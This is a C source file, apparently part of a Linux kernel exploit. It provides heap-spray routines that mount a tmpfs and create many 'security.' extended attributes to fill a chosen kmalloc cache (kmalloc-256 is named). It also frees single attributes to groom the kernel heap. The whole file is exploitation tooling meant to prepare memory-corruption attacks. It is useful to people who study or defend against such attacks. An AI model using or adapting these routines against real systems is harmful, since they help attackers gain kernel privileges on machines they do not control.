#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include "xattr_spray.h"

char *generate_tmp_filename(void) {
    static char buffer[FILENAME_MAX_LEN];
    static uint64_t counter = 0;
    snprintf(buffer, FILENAME_MAX_LEN, "/tmp/tmpfs/file%lu", counter);
    counter++;
    return buffer;
}

void create_xattr(const char *filename, char *attribute_name, char *xattr_value) {
    if (setxattr(filename, attribute_name, xattr_value, strlen(xattr_value), XATTR_CREATE) < 0)
    {
        perror("setxattr");
        exit(-1);
    }
}

void spray_simple_xattr(char *filename, uint32_t objsize, uint32_t spray_size) {
    char attribute_name[ATTRIBUTE_NAME_LEN];
    char xattr_value[XATTR_VALUE_LEN] = {0,};

    size_t value_len = objsize - 32;
    memset(xattr_value, 0x41, value_len);

    /* Mount a new tmpfs to be able to set security xattr */
    if (mkdir("/tmp/tmpfs", S_IRWXU) == -1 && errno != EEXIST) {
		perror("mkdir");
        exit(-1);
    }

    if (mount(NULL, "/tmp/tmpfs", "tmpfs", 0, NULL) == -1){
		perror("mount");
        exit(-1);
    }
    /* Create a file to the set attributes */
    int fd = creat(filename, 0644);
    close(fd);

    for (uint64_t i = 0; i < spray_size; i++) {
        /* Need that the name is allocated within `kmalloc-256` */
        snprintf(attribute_name, ATTRIBUTE_NAME_LEN, "security.attr%ld", i+1);
        create_xattr(filename, attribute_name, xattr_value);
    }
}

void free_simple_xattr(char *filename, uint64_t idx){
    char attribute_name[ATTRIBUTE_NAME_LEN];
    snprintf(attribute_name, ATTRIBUTE_NAME_LEN, "security.attr%ld", idx);
    removexattr(filename, attribute_name);
}

void spray_simple_xattr2(char *filename, uint32_t minsize, uint32_t spray_size) {
    char attribute_name[ATTRIBUTE_NAME_LEN];
    char xattr_value[XATTR_VALUE_LEN] = {0,};

    size_t value_len = minsize - 32;
    memset(xattr_value, 0x41, value_len);

    /* Mount a new tmpfs to be able to set security xattr */
    if (mkdir("/tmp/tmpfs", S_IRWXU) == -1 && errno != EEXIST) {
		perror("mkdir");
        exit(-1);
    }

    if (mount(NULL, "/tmp/tmpfs", "tmpfs", 0, NULL) == -1){
		perror("mount");
        exit(-1);
    }
    /* Create a file to the set attributes */
    int fd = creat(filename, 0644);
    close(fd);

    for (uint64_t i = 0; i < spray_size; i++) {
        /* Need that the name is allocated within `kmalloc-256` */
        snprintf(attribute_name, ATTRIBUTE_NAME_LEN, "security.attr%ld", i+1);
        create_xattr(filename, attribute_name, xattr_value);
        xattr_value[strlen(xattr_value)] = 0x41;
    }
}
